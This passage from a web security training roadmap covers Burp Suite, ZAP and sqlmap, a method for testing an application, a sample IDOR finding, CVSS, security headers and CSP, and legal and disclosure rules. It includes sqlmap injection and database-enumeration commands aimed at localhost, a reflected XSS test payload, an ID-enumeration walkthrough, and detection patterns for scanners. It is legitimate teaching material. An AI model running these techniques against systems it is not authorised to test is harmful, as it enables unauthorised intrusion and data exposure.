**Chaining is the skill that separates a report from a scan output.** A scanner flags the enumeration as informational. A human writes the chain and explains that the combination is critical.

### Part 5 — Tools, and how to use them

#### Burp Suite Community, and what the free version does

Burp Suite is a proxy that sits between your browser and the target, letting you see and modify every request. The Community edition is free and is sufficient for the whole of this phase.

| Feature | What it does | Community limits |
|---|---|---|
| **Proxy** | Intercepts requests and responses | Fully available |
| **HTTP history** | Every request the browser made, in order | Fully available |
| **Repeater** | Modify and resend a single request | Fully available |
| **Decoder** | Encode and decode base64, URL, HTML, hex | Fully available |
| **Comparer** | Diff two responses byte by byte | Fully available |
| **Intruder** | Automated request variation | **Rate-limited in Community**, which is deliberate |
| **Scanner** | Automated vulnerability scanning | **Not available in Community** |
| **Extensions** | A large ecosystem | Available, from the BApp Store |

**The Intruder limitation is the one that matters**, and its practical effect is that you do manual testing rather than automated fuzzing. This is not a serious handicap for learning. The Apprentice and Practitioner labs on PortSwigger's Academy are designed to be solved by hand. Solving them by hand is what teaches the vulnerability.

**Nothing is lost by using Community for this phase.** The skill being assessed in an interview is your reasoning about a request, not how many scanner features you can reach.

#### The workflow that works

```text
1. Set the browser to use Burp as its proxy, and install Burp's CA certificate
   so HTTPS interception works. Do this only on a lab machine or a browser
   profile you use for authorised testing.

2. Turn interception on and browse the target normally. Every request is now
   in the HTTP history.

3. Turn interception off. Use the HTTP history as your map of the application
   rather than interrupting every request.

4. Identify the interesting requests: anything with an identifier in the path
   or a parameter, anything that changes state, anything that returns data
   belonging to a user.

5. Send the request to Repeater. This is where the work happens.

6. In Repeater, change one thing at a time and observe the response. Record
   the request, the response, and the conclusion.

7. When you have a finding, capture both the original and the modified request
   as your evidence.
```

**Step six is the discipline that is missing from most beginners' testing.** Changing one thing at a time is how you know which change produced the result. Changing three things and seeing a different response tells you nothing except that something matters.

#### OWASP ZAP, and why you should know both

ZAP is free and open source, with no feature gating, and its automated scanner is available at no cost.

| | Burp Suite Community | OWASP ZAP |
|---|---|---|
| **Cost** | Free, with limitations | Free and open source, no limitations |
| **Automated scanning** | Not available | **Available** |
| **Intruder equivalent** | Rate-limited | Unrestricted |
| **Interface** | Polished, and the industry default | Less polished, and entirely capable |
| **Job postings mentioning it** | Very frequently | Frequently |
| **Best use** | Manual testing, and the tool most teams run | Automated scanning, and learning on a $0 budget |

**Use both.** ZAP gives you the automated scan that Burp Community withholds, and Burp gives you the interface you will meet in a real team. Learning both is a day's work once you understand the concepts, because they are the same tool with different buttons.

```bash
# ZAP in daemon mode, with a baseline scan against an authorised local target.
docker run --rm -t ghcr.io/zaproxy/zaproxy:stable \
  zap-baseline.py -t http://localhost:3000 -r baseline-report.html

# A full scan, which is slower and much noisier. Only against a target you own.
docker run --rm -t ghcr.io/zaproxy/zaproxy:stable \
  zap-full-scan.py -t http://localhost:3000 -r full-report.html
```

**The baseline scan is the one to learn first**, because it is passive and safe: it spiders the application and reports what it observes without attacking. It is a reasonable thing to run against an application you have just deployed and own.

```bash
# sqlmap — a SQL injection tool. Only ever against an authorised target.
# Start with a single parameter, and keep the risk and level low.
sqlmap -u "http://localhost:3000/api/products?id=1" \
  --batch --level=1 --risk=1 --dbms=sqlite

# Enumerate databases only after confirming injection, and only in a lab.
sqlmap -u "http://localhost:3000/api/products?id=1" --batch --dbs
```

**Two cautions about `sqlmap` that matter more than the command.** It sends a large volume of requests, so it will be detected and rate-limited. On a fragile application it can also disrupt service. And running it against anything other than a target you own or have written authorisation for is a criminal offence in most jurisdictions. In this phase you run it against Juice Shop on `localhost` and nothing else.

#### The labs, and the order to do them in

| Platform | What it gives you | Cost | Best for |
|---|---|---|---|
| **PortSwigger Web Security Academy** | Structured labs with theory, from Apprentice to Expert, covering every OWASP category | Free | The core of this phase |
| **OWASP Juice Shop** | A complete vulnerable application you run locally | Free | Practising on a whole app rather than isolated labs |
| **DVWA** | A deliberately vulnerable PHP application with adjustable difficulty | Free | Seeing the same vulnerability at four difficulty levels |
| **bWAPP** | A large set of vulnerable scenarios | Free | Breadth, once you know the basics |
| **OWASP WebGoat** | Guided lessons with explanations | Free | Learning the concepts with instruction |
| **HackTheBox** | Machines and web challenges | Freemium | After the Academy, for less guided practice |
| **TryHackMe** | Guided rooms including web paths | Freemium | If you prefer more hand-holding than PortSwigger offers |

**Start with PortSwigger and do not spread across platforms.** The Academy's structure is better than any alternative. Its explanations are written by the people who wrote the definitive reference on the subject. Finishing its Apprentice labs is a concrete, verifiable achievement.

| Order | Labs | Why this order |
|---|---|---|
| 1 | Access control, Apprentice | The most common real vulnerability, and the easiest to understand |
| 2 | SQL injection, Apprentice | Teaches injection properly once, and the concept transfers |
| 3 | Cross-site scripting, Apprentice | Teaches the three flavours and the difference between them |
| 4 | CSRF, Apprentice | Small set, and it makes the same-origin policy concrete |
| 5 | SSRF, Apprentice | Chains into the cloud material from Phase 9 |
| 6 | Authentication, Apprentice | The flows, and the account takeover path |
| 7 | Two categories at Practitioner level | Depth in the areas you found most interesting |

### Part 6 — Testing method, and the web finding

#### A method, so you are not wandering

Random clicking in Burp finds random things. A method finds the things that matter, in an order that respects how the application is built.

| Phase | What you do | What you are looking for |
|---|---|---|
| **1. Map** | Browse everything with the proxy on. Identify roles, features, and data | The full attack surface, including API endpoints and admin areas |
| **2. Authenticate at two levels** | Create two accounts, and note the identifiers | The material for every access control test |
| **3. Test access control** | Take every object identifier and try it as the other user, and unauthenticated | IDOR, vertical escalation, forced browsing |
| **4. Test input handling** | For each parameter, try payloads appropriate to its context | SQL, command, template, and NoSQL injection |
| **5. Test output handling** | Put a unique marker in every field and search for it wherever it renders | Reflected, stored, and DOM-based XSS |
| **6. Test state-changing requests** | Check for anti-CSRF tokens and `SameSite`, and try the request cross-origin | CSRF |
| **7. Test authentication flows** | Walk the reset, email change, and MFA flows as an attacker | Account takeover paths |
| **8. Test for SSRF** | Anywhere the server fetches a URL, point it at an internal address | SSRF, and cloud metadata reach |
| **9. Review configuration** | Headers, error pages, cookies, CORS, directory listings | Misconfiguration |
| **10. Chain** | Combine what you found into the most serious outcome you can demonstrate | The finding that matters |

**Steps 1, 2, and 3 produce the most findings in a real assessment**, and they require the least technical sophistication. Broken access control is the top category for a reason.

#### Writing the finding, which is the actual deliverable

A finding is a document with a specific audience: a developer who must fix it, and a manager who must prioritise it.

```text
## Finding 3 — Any authenticated user can read any other customer's
## order notes (IDOR)

**Severity:** High
**CVSS 3.1:** 7.1 — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
**OWASP Top 10:** A01 Broken Access Control
**CWE:** CWE-639 — Authorization Bypass Through User-Controlled Key
**Affected endpoint:** GET /api/v1/orders/{order_id}/notes

### Description
The endpoint authenticates the request but does not verify that the
authenticated user owns the order being requested. The order identifier is
a sequential integer, so any authenticated user can enumerate the entire
order history of every customer, including internal delivery notes.

### Reproduction
  1. Sign in as customer A (user id 1042). Browse to an order and note that
     the application requests GET /api/v1/orders/1042/notes.
  2. In Burp Suite, send that request to Repeater.
  3. Change the order id to 1043, which belongs to customer B, and send.

  Request:
    GET /api/v1/orders/1043/notes HTTP/1.1
    Host: app.example.com
    Cookie: session=<customer A's session>

  Response:
    HTTP/1.1 200 OK
    Content-Type: application/json

    {"order_id":1043,"owner_id":1099,"note":"Gate code 4471. Leave with
     reception if nobody answers."}

  The response contains another customer's order note and confirms that
  the order belongs to user 1099, not to the authenticated user 1042.

  4. Enumerating ids 1000–1100 returned notes for 94 distinct customers
     in under four minutes with no rate limiting.

### Evidence
  - burp-repeater-idor-1043.png — the modified request and the response
  - enumeration-results.csv — 94 order ids and the owner_ids returned
  - har/session.har — the recorded session for reproduction

### Impact
An authenticated attacker with any valid account can read the delivery
notes of every customer. In the sampled data those notes contained gate
codes, door codes, and instructions about when a property is unoccupied.
This is a confidentiality breach of customer data, and in combination with
the address data in the order record it represents a physical safety risk
to customers, not only a data protection issue.

### Likelihood
High. The exploit requires only a standard account, the identifiers are
sequential, and no rate limiting is present.

### Remediation
  1. Scope the query to the authenticated user:
     filter(Order.id == order_id, Order.owner_id == current_user.id)
  2. Return 404 rather than 403 when the order exists but is not owned,
     so the response does not confirm existence.
  3. Replace sequential identifiers with unguessable ones (UUIDv4) as
     defence in depth. This is not a fix on its own.
  4. Add a rate limit and an alert on repeated 404s from one session,
     which is what an enumeration attempt looks like.
  5. Add a regression test asserting that user A receives 404 for
     user B's order id.

### Verification
After the fix, re-ran the reproduction. The same request returned
HTTP 404 with body {"detail":"Not found"}. The enumeration script
returned 0 notes across 100 ids.
```

That finding has every element a professional report needs, and each is doing a specific job.

| Element | Why it is there |
|---|---|
| **Severity and CVSS vector** | Lets a manager prioritise, and shows the reasoning rather than a bare number |
| **OWASP category and CWE** | Lets the developer find the standard guidance for this class of bug |
| **Affected endpoint** | So the developer knows exactly where to look |
| **Reproduction with raw request and response** | The most important section. A developer who can reproduce it can fix it |
| **Evidence files** | Verification, and the artefact that survives the ticket being forwarded |
| **Impact in business terms** | Gate codes and unoccupied properties — not “confidentiality impact” |
| **Likelihood** | Separates a theoretical issue from one anyone can exploit today |
| **Remediation with the code-level fix first** | Actionable, prioritised, and specific |
| **Verification** | Proves the fix, which is what closes the ticket |

**The remediation ordering is deliberate.** The authorisation fix is first because it is the actual fix. The UUID change is third because it is defence in depth and explicitly not a substitute. A finding that offers only “use UUIDs” has not understood the bug.

#### CVSS, used honestly

CVSS produces a number from a set of metrics. The number is useful for triage and it is frequently misused as a substitute for judgement.

| Metric group | Question | Values |
|---|---|---|
| **Base — exploitability** | Attack vector, complexity, privileges required, user interaction | Network, adjacent, local, physical |
| **Base — impact** | Confidentiality, integrity, availability | None, low, high |
| **Base — scope** | Does the impact cross a trust boundary? | Unchanged, changed |
| **Temporal** | Is there a working exploit? Is it officially fixed? | Depends on the situation |
| **Environmental** | How important is this asset to you specifically? | Set by the organisation |

**The trap is treating the base score as the priority.** An IDOR rated 7.1 on a system holding public marketing data is less urgent than the same 7.1 on a system holding health records.

The environmental metrics exist for exactly that reason, and most organisations do not fill them in.

| Score band | Typical label | What it usually triggers |
|---|---|---|
| 9.0–10.0 | Critical | Immediate remediation, out of hours if necessary |
| 7.0–8.9 | High | Remediation within days |
| 4.0–6.9 | Medium | Scheduled remediation |
| 0.1–3.9 | Low | Accepted, or remediated opportunistically |
| 0.0 | None | Informational |

**An honest finding states the base vector.** It then says whether the environmental factors raise or lower the real priority. A report that gives a number and no context has passed the work to someone else.

#### Worked example: from lab to finding

Here is how one PortSwigger lab becomes a portfolio finding.

```text
Lab            PortSwigger Academy — Insecure direct object references
Target         https://LAB-ID.web-security-academy.net (a purpose-built
               vulnerable application provided by the platform)

What I did
  1. Signed in and captured the session cookie.
  2. Noticed the transcript download endpoint:
       GET /download-transcript/2.txt
     The filename is a sequential number.
  3. Sent the request to Repeater and requested 1.txt, then 3.txt.
     1.txt returned another user's transcript containing a password.
  4. Used the recovered credentials to sign in as that user and complete
     the lab objective.

What I wrote up beyond the lab
  - A finding in the standard format, with the raw request and response.
  - The impact statement written for the application's owner, describing
    what a sequential filename means at scale: every transcript, for every
    user, enumerable by anyone with an account.
  - The remediation: authorise the request against the session, and stop
    serving transcripts as static files in a shared directory. The second
    point is the durable one, because the flaw is architectural — the file
    is served without the application being consulted at all.
  - A limitations note: the target is an intentionally vulnerable
    application, so the finding demonstrates method rather than a discovery.
```

**That last bullet is the honesty requirement, and it is the same one Phase 6 described.** The target is a lab. Saying so plainly costs nothing and prevents the reader from wondering whether you tested something you should not have.

**The remediation is where the extra value is.** A beginner writes “add an authorisation check”. A better finding notices that a static file served directly by the web server never reaches application code at all. An authorisation check in the application would therefore not run. That observation is the difference between a fix that works and a fix that appears to work.

### Part 7 — The defender's side: headers, CSP, and logging

#### Security headers, configured deliberately

| Header | Recommended value | What it prevents |
|---|---|---|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains; preload` | Protocol downgrade and cookie theft |
| `Content-Security-Policy` | Start with `default-src 'self'` and tighten | XSS, and much else |
| `X-Content-Type-Options` | `nosniff` | MIME confusion, where an upload is treated as script |
| `X-Frame-Options` | `DENY`, or CSP `frame-ancestors 'none'` | Clickjacking |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Leaking URLs, and tokens in them, to third parties |
| `Permissions-Policy` | Deny features you do not use | Camera, microphone, and geolocation abuse |
| `Cache-Control` | `no-store` on authenticated responses | Sensitive data left in caches |
| `Cross-Origin-Opener-Policy` | `same-origin` | Cross-window attacks |
| `Cross-Origin-Resource-Policy` | `same-origin` | Cross-origin resource leaks |

**A content security policy is the highest-value header and the hardest to get right.** Learn what the common directives do. A weak policy is common, and a strong one is genuinely protective.

| Directive | Controls |
|---|---|
| `default-src` | The fallback for every resource type not otherwise specified |
| `script-src` | Where JavaScript may be loaded from |
| `style-src` | Where stylesheets may be loaded from |
| `img-src` | Where images may be loaded from |
| `connect-src` | Where `fetch` and `XMLHttpRequest` may go |
| `frame-ancestors` | Who may embed the page — the modern replacement for `X-Frame-Options` |
| `form-action` | Where forms may submit |
| `base-uri` | What `<base>` may be set to |
| `object-src` | Plugins — should be `'none'` |
| `report-uri` or `report-to` | Where violation reports are sent |

```text
Weak policy, and why:
  Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval'
  The two 'unsafe-' keywords re-enable the inline and eval behaviour that a CSP
  exists to prevent. The policy is present and provides almost nothing.

Stronger starting policy:
  Content-Security-Policy: default-src 'self'; script-src 'self';
    style-src 'self'; img-src 'self' data:; connect-src 'self';
    frame-ancestors 'none'; base-uri 'self'; object-src 'none';
    form-action 'self'; upgrade-insecure-requests

Deployment approach that does not break the site:
  1. Deploy with Content-Security-Policy-Report-Only and a report endpoint.
  2. Collect violations for two weeks and fix the legitimate ones.
  3. Enforce, and expect to iterate.
```

**The report-only deployment is the professional method.** Enforcing a strict CSP on a live application without a reporting period breaks things. A CSP that has been rolled back is worse than one that was never added, because nobody will try again.

#### Logging that detects a web attack

The Phase 10 skill applies directly. These are the events worth logging and alerting on.

| Event | Signal it produces | Detection |
|---|---|---|
| Failed logins by account and by IP | A burst from one address across many accounts | Credential stuffing |
| Authorisation denials | Repeated 403 or 404 on object identifiers | IDOR enumeration |
| Password reset requests | Volume, and the same token requested repeatedly | Reset abuse |
| Input that trips validation | A pattern of payload-shaped input from one session | Injection probing |
| Files written outside the upload directory | A path outside the expected location | Webshell upload |
| Requests with unusual user agents or methods | `sqlmap`, `nikto`, or unexpected `PUT` | Automated scanning |
| Access to `/admin`, `/.git`, `/backup` | 404 storms from one source | Forced browsing |

**The IDOR detection is the one that is almost always missing.** It is also straightforward to build once you have identified the objects. Log every 404 on a path that contains an identifier, then alert when one session produces more than a handful in a short window. That is what enumeration looks like, and it is the difference between discovering an IDOR campaign and reading about it in a breach notification.

#### Worked example: reviewing an application's configuration

```text
TARGET REVIEW — configuration observations
Target: a lab application I deployed locally. Authorised: it is mine.

  Finding A — Missing Strict-Transport-Security on the authenticated area
    Observation  No HSTS header on any response.
    Impact       A user on a hostile network can be downgraded to HTTP, and
                 the session cookie can be intercepted. The cookie does have
                 Secure set, which limits but does not remove the exposure.
    Fix          Add max-age=31536000; includeSubDomains; preload after
                 confirming every subdomain supports HTTPS.

  Finding B — Content-Security-Policy absent
    Observation  No CSP on any response.
    Impact       Any XSS becomes directly exploitable. The application has
                 one reflected XSS point in the search parameter (finding D).
    Fix          Deploy report-only for two weeks, then enforce.

  Finding C — Directory listing enabled on /static/uploads
    Observation  Requesting the directory returns an index of files.
    Impact       Uploaded files are enumerable, including files whose names
                 were not disclosed anywhere.
    Fix          Disable autoindex, and serve uploads through the
                 application so authorisation applies.

  Finding D — Reflected XSS in the search parameter
    Observation  ?q=<script>alert(1)</script> is reflected unescaped into
                 the results heading.
    Impact       Session theft if HttpOnly were absent (it is present, so
                 the impact is authenticated actions and page defacement
                 for the victim's session).
    Fix          Escape at the point of output, and add the CSP from
                 finding B as defence in depth.

  Limitations
    This is a configuration review of an application I wrote and deployed,
    tested on localhost only. It is not a full assessment: business logic,
    authentication flows, and file upload handling were not tested.
```

**Note how finding D honestly accounts for `HttpOnly`.** A beginner writes “session hijacking possible” for every XSS. A better finding checks whether it actually is, and adjusts the impact when the cookie flag prevents it. It still reports the flaw, because the flaw is real.

### Part 8 — Legal and ethical boundaries

#### Authorisation is what makes the work possible

This is the most legally dangerous phase in the roadmap, and the boundaries are not negotiable. Testing a web application you do not own is unauthorised access, and it is a criminal offence in most jurisdictions including the Philippines under Republic Act 10175.

**The technologies involved make this worse, not better.** A web request is cheap, anonymous, and easy to send by accident. The same tooling that tests an authorised target will test an unauthorised one without any warning.

| What you might think | What the law sees |
|---|---|
| “It is a public website, so it is fair game” | Public accessibility is not permission to test |
| “I only sent one request” | Unauthorised access. The number of requests is not the test |
| “I did not change anything” | Damage is not an element of the offence |
| “I found a bug, so I was helping” | Intent is not a defence. Report it through the proper channel |
| “The company has a bug bounty, so anything goes” | The programme's scope defines what is permitted, and out-of-scope testing is not covered |
| “I used a scanner, not my own exploit” | Running a scanner against someone else's site is unauthorised access |
| “It was a staging site nobody uses” | Ownership is the test, not use |
| “I was on a VPN so it is fine” | Anonymity is an aggravating factor, not a defence |

#### Where you practise, which is free and unlimited

| Target | What it teaches | Cost |
|---|---|---|
| **PortSwigger Web Security Academy** | Every OWASP category, with structured labs | Free |
| **OWASP Juice Shop** | A full application you run locally | Free |
| **DVWA** | The same flaw at four difficulty levels | Free |
| **OWASP WebGoat and bWAPP** | Guided lessons and broad scenario coverage | Free |
| **A local application you wrote and deployed** | Realistic, and entirely yours | Free |
| **An authorised client engagement with a signed scope** | The real thing | Not yet |

**There is no reason to test an unauthorised target**, and the reason is not only legal. A lab target comes with a known answer and a safe environment. There is no risk of causing harm, which means you can experiment freely and break things. You learn faster than you could on a live site where every request is a potential incident.

#### Reading a bug bounty scope properly

If you ever participate in a bug bounty programme, the scope is the authorisation document, and the details matter.

| Scope element | What to check |
|---|---|
| **In-scope assets** | The exact domains, wildcards, and applications. `*.example.com` may or may not include a third-party host |
| **Out-of-scope assets** | Usually includes affiliated sites, marketing pages, and anything on a third-party platform |
| **Permitted testing** | Some programmes prohibit automated scanning, denial of service testing, or social engineering |
| **Rate limits** | Programmes often require you to limit request volume |
| **Data handling** | If you access real user data, the programme will specify what you must do — usually stop and report |
| **Disclosure** | Whether and when you may publish |
| **Safe harbour** | Whether the programme offers legal protection for good-faith testing inside the scope |

**The safe harbour clause is the one that matters legally**, and not every programme has one. Testing even inside the scope of a programme with no safe harbour is a different risk calculation from testing inside a programme with one.

#### Responsible disclosure, done properly

If you find a vulnerability by accident, there is a correct sequence.

| Step | What you do | What you do not do |
|---|---|---|
| 1 | Stop testing immediately | Continue to confirm the impact |
| 2 | Record what you saw, factually, without accessing more data than necessary | Download data to prove the point |
| 3 | Find the security contact — a `security.txt` file, a security page, or the vendor's security email | Post on social media |
| 4 | Report factually and privately, with enough detail to reproduce | Demand payment, or set a public ultimatum |
| 5 | Allow reasonable time for a fix, and coordinate any disclosure | Disclose immediately on a short deadline |
| 6 | Keep the correspondence | Discuss the details publicly |

`security.txt` is a standard file at `/.well-known/security.txt` that organisations publish with their security contact and disclosure policy. Checking for it is the first step of any disclosure.

**The most important line in that table is step one.** A person who finds a vulnerability, stops, and reports it has done the right thing. A person who finds one and spends an afternoon exploring how far it goes has committed a crime, regardless of how they started.

#### Instruments that formalise permission

| Instrument | What it does |
|---|---|
| **Rules of engagement** | Defines what you may test, when, and how |
| **Statement of work** | The contractual basis, including scope and limitations |
| **Bug bounty scope and policy** | Permission for a defined set of assets, with conditions |
| **Non-disclosure agreement** | Your obligation about what you learn |
| **Practical exam rules** | Permission limited to the specific exam environment |

**The exam-rules row is worth understanding.** A practical certification exam grants you permission to attack a specific environment for a specific period. That permission does not extend to any other system, and attacking anything else during an exam is both a crime and grounds for disqualification.

### Key takeaways

- **Your web development background is the asset, not a gap.** You already know how a request becomes a response; the new skill is making code fail deliberately.
- **The same-origin policy is the real security boundary**, and it works on origins — scheme plus host plus port — not on hosts.
- **Broken access control is the most common serious web vulnerability**, because authentication is visible and authorisation is invisible. Every developer remembers the login and forgets the ownership check.
- **IDOR is the highest-yield test you can run.** Change an identifier, use another account, and see whether the answer changes.
- **Parameterised queries are the only real SQL injection fix.** Not escaping, not a blocklist — and identifiers need an allowlist because they cannot be parameterised.
- **Injection is about an interpreter, not about SQL.** NoSQL, LDAP, template, command, and header injection are the same bug in different places.
- **Escape at the point of output**, because the correct encoding depends on the destination context, and escaping on input corrupts the data and still fails.
- **Stored XSS is the most serious flavour**, because one submission compromises every viewer.
- **`HttpOnly` reduces XSS impact but does not fix it.** The script can still act as the user.
- **A state change on a `GET` request is a design flaw**, and it makes CSRF trivial because no form and no JavaScript are needed.
- **SSRF is critical because the server is inside the network.** It reaches internal services and cloud metadata that the attacker cannot reach directly, and every application-layer defence has a bypass.
- **Session identifier regeneration on login is what prevents session fixation**, and server-side invalidation on logout is what makes logout real.
- **Chaining small flaws produces the serious finding.** Five low-severity issues that add up to account takeover should be reported as one chain, not five tickets.
- **The reproduction section is the most important part of a finding.** A developer who can reproduce it can fix it.
- **CVSS is a triage input, not a priority.** The same score on a marketing site and a health records system are not the same problem.
- **A CSP with `'unsafe-inline'` provides almost nothing.** Deploy report-only first, or you will roll it back and never try again.
- **Log the authorisation denials.** Repeated 404s on object identifiers from one session is what an IDOR enumeration campaign looks like.
- **Test only what you own or have written authorisation for.** A public website is not fair game, one request is still unauthorised access, and finding a bug does not authorise finding it.

### Practice this next

The nine tasks build a web testing capability on free lab targets, and end with findings rather than flags. Work them in order.

1. **Set up the lab environment first** (task 1): Burp Suite Community plus a browser profile you use only for authorised testing, with the CA certificate installed so HTTPS interception works. Then run OWASP Juice Shop locally with Docker, so you have a whole application as well as the PortSwigger labs.
2. **Map an application before testing it** (task 2). With interception off, browse Juice Shop completely with the proxy recording. Produce an endpoint inventory: every path, method, parameter, and whether it required authentication. That map is what makes the rest of the testing systematic.
3. **Do the access control labs first** (task 3), because they are the most common real vulnerability and they teach the two-account method. For each lab, record the identifier you changed and the response difference that proved it.
4. **Test the same-origin policy by hand** (task 4). Build a tiny page on a different local origin that makes a cross-origin request to Juice Shop, observe what the browser allows and blocks, then repeat with a permissive CORS header. Seeing it once makes the concept permanent.
5. **Work through injection properly** (tasks 5 and 6): the SQL injection Apprentice labs by hand first, then confirm one with `sqlmap` against Juice Shop on localhost and compare what the tool reports with what you found manually.
6. **Do the XSS and CSRF labs** (task 6), covering all three XSS flavours, and for each one write down whether `HttpOnly` would have changed the impact.
7. **Write three findings in the full format** (task 7) from the labs, each with severity, CVSS vector, reproduction with raw requests, impact in business language, remediation, and verification. Include one honest limitations note about the target being a lab.
8. **Review a configuration** (task 8) on your own local deployment: headers, cookies, CORS, error pages, and directory listings. Produce the observation list with a fix and a defence-in-depth measure for each.
9. **Write the boundary note** (task 9): what you may test, the instruments that grant permission, what you would do on discovering a vulnerability by accident, and the exact sequence you would follow. Keep it to a page, and keep it where you will see it.

Then open `portfolio/cyber/14-web-app-security.md` and assemble the deliverables. **The phase is done when you can read a request and response, identify the OWASP category, demonstrate the flaw safely on an authorised target, and write a finding with reproduction steps and a specific remediation** — and the findings should be good enough that a developer could act on them without asking you a question.

## Tools for This Phase

| Tool | What it does | Cost | Official link | Mini-task | Free alternative |
|---|---|---|---|---|---|
| Burp Suite Community | Web proxy, repeater, and decoder | Free/community | https://portswigger.net/burp/communitydownload | Intercept a login and replay it with Repeater | OWASP ZAP |
| OWASP ZAP | Web proxy, scanner, and fuzzer | Free/open-source | https://www.zaproxy.org/ | Run a baseline scan against Juice Shop on localhost | Burp Suite Community |
| PortSwigger Web Security Academy | Structured web security labs | Free | https://portswigger.net/web-security | Complete all Apprentice access control labs | OWASP WebGoat |
| OWASP Juice Shop | Deliberately vulnerable application | Free/open-source | https://owasp.org/www-project-juice-shop/ | Run locally with Docker and complete the first five challenges | DVWA or bWAPP |
| DVWA | Vulnerable PHP application with difficulty levels | Free/open-source | https://github.com/digininja/DVWA | Solve one SQL injection challenge at Low and at High | Juice Shop |
| OWASP WebGoat | Guided lessons on web flaws | Free/open-source | https://owasp.org/www-project-webgoat/ | Complete the access control and injection lessons | PortSwigger Academy |
| sqlmap | Automated SQL injection testing | Free/open-source | https://sqlmap.org/ | Confirm one injection against Juice Shop on localhost only | Manual payload testing in Repeater |
| Postman | API request building and testing | Freemium | https://www.postman.com/ | Send an authenticated API request and inspect the response | curl, or Burp Repeater |
| curl | Command-line HTTP client | Free/open-source | https://curl.se/ | Fetch a response with headers and inspect the security headers | PowerShell `Invoke-WebRequest` |
| Mozilla Observatory | HTTP security header grading | Free | https://developer.mozilla.org/en-US/observatory | Grade a site you own and fix one header | Manual header review |
| Security Headers | Response header analysis | Free | https://securityheaders.com/ | Check a site you own and note the missing headers | Manual inspection in Burp |
| Docker | Run vulnerable lab applications locally | Free | https://www.docker.com/ | Start Juice Shop with one command | A local PHP or Node install without containers |
| jwt.io | Decode and inspect JWTs | Free | https://jwt.io/ | Decode a session token and inspect the claims | CyberChef base64 decode |

## Free/cheap resources

- OWASP Top 10 — https://owasp.org/www-project-top-ten/
- OWASP Web Security Testing Guide — https://owasp.org/www-project-web-security-testing-guide/
- OWASP Cheat Sheet Series — https://cheatsheetseries.owasp.org/
- PortSwigger Web Security Academy — https://portswigger.net/web-security
- PortSwigger learning paths — https://portswigger.net/web-security/learning-paths
- OWASP Juice Shop documentation — https://pwning.owasp-juice.shop/
- OWASP ZAP documentation — https://www.zaproxy.org/docs/
- MDN HTTP documentation — https://developer.mozilla.org/en-US/docs/Web/HTTP
- MDN Content Security Policy reference — https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- CVSS 3.1 specification — https://www.first.org/cvss/v3.1/specification-document
- CWE Top 25 — https://cwe.mitre.org/top25/
- RFC 9110 HTTP semantics — https://www.rfc-editor.org/rfc/rfc9110.html
- security.txt specification — https://securitytxt.org/

## Hands-on practice tasks

1. Set up Burp Suite Community with a browser profile for authorised testing, and run Juice Shop locally.
2. Map an application with the proxy recording and produce an endpoint inventory with methods and parameters.
3. Complete the PortSwigger access control Apprentice labs using two accounts and record each identifier change.
4. Demonstrate the same-origin policy by hand with a cross-origin request, then repeat with permissive CORS.
5. Complete the SQL injection Apprentice labs manually, then confirm one with sqlmap against localhost only.
6. Complete the XSS and CSRF Apprentice labs covering all three XSS flavours and one token defeat.
7. Write three findings in the full format with CVSS, reproduction, impact, remediation, and verification.
8. Review a local deployment's headers, cookies, CORS, error pages, and directory listings, with a fix per observation.
9. Write a one-page legal boundary note covering permission, disclosure steps, and what you will not test.

## Deliverable / proof of work

Create `portfolio/cyber/14-web-app-security.md` with:

- An endpoint inventory from mapping an application with a proxy
- Evidence of two accounts and an IDOR demonstration with the request and response
- A same-origin policy demonstration with the browser's behaviour recorded
- SQL injection evidence from a manual test and from sqlmap on localhost
- XSS evidence covering reflected, stored, and DOM-based flavours
- A CSRF demonstration showing which defence was missing
- An SSRF demonstration against the cloud metadata address in a local lab
- Three findings in the full format with severity, CVSS vector, reproduction, impact, and remediation
- A configuration review with headers, cookies, CORS, error pages, and directory listings
- A one-page legal and ethical boundary note including your disclosure sequence

## Checklist

- [ ] I can read a full HTTP request and explain the security meaning of each header. <!-- id: cyber-14-http-request-reading energy: low -->
- [ ] I can evaluate a response's security headers and say what each missing one allows. <!-- id: cyber-14-security-headers energy: normal -->
- [ ] I can explain the same-origin policy and demonstrate it. <!-- id: cyber-14-same-origin-demo energy: normal -->
- [ ] I can identify which OWASP Top 10 category a flaw belongs to and justify it. <!-- id: cyber-14-owasp-classification energy: normal -->
- [ ] I found and demonstrated an IDOR using two accounts. <!-- id: cyber-14-idor-demonstration energy: normal -->
- [ ] I demonstrated SQL injection manually and explained why parameterisation fixes it. <!-- id: cyber-14-sqli-demonstration energy: normal -->
- [ ] I explained why identifiers need an allowlist rather than a parameter. <!-- id: cyber-14-identifier-allowlist energy: low -->
- [ ] I demonstrated reflected, stored, and DOM-based XSS and explained the difference. <!-- id: cyber-14-xss-three-flavours energy: normal -->
- [ ] I demonstrated a CSRF and identified which defence was missing. <!-- id: cyber-14-csrf-demonstration energy: normal -->
- [ ] I demonstrated SSRF reaching the cloud metadata address in a local lab. <!-- id: cyber-14-ssrf-demonstration energy: normal -->
- [ ] I tested session handling including identifier regeneration on login and server-side logout. <!-- id: cyber-14-session-testing energy: normal -->
- [ ] I chained two or more small flaws into one higher-severity finding. <!-- id: cyber-14-finding-chaining energy: high -->
- [ ] I used Burp Repeater and changed one thing at a time while recording results. <!-- id: cyber-14-burp-repeater-workflow energy: normal -->
- [ ] I wrote a finding with a full reproduction, raw requests, and a specific remediation. <!-- id: cyber-14-web-finding-written energy: high -->
- [ ] I can defend a CVSS vector and explain why it is a triage input rather than a priority. <!-- id: cyber-14-cvss-reasoning energy: low -->
- [ ] I reviewed a configuration and proposed a defence-in-depth measure per finding. <!-- id: cyber-14-config-review energy: normal -->
- [ ] I wrote down exactly what I may test and the sequence I would follow on an accidental discovery. <!-- id: cyber-14-web-legal-boundaries energy: low -->

## You're ready to move on when...

You can read a web application's request and response, identify which OWASP Top 10 category a flaw belongs to, demonstrate it safely against an authorised lab target with Burp Suite, and write a finding with reproduction steps and a specific remediation.

## Free vs Paid

### What's free and enough

PortSwigger Web Security Academy is free and is the best structured web security training that exists, covering every OWASP category from Apprentice to Expert. OWASP Juice Shop, DVWA, WebGoat, and bWAPP are free and you run them locally. Burp Suite Community and OWASP ZAP are both free, and ZAP's scanner has no feature gate. The OWASP Top 10, the Web Security Testing Guide, and the Cheat Sheet Series are free and are the reference documents professionals actually use. Everything this phase teaches can be learned to an employable standard without spending anything.

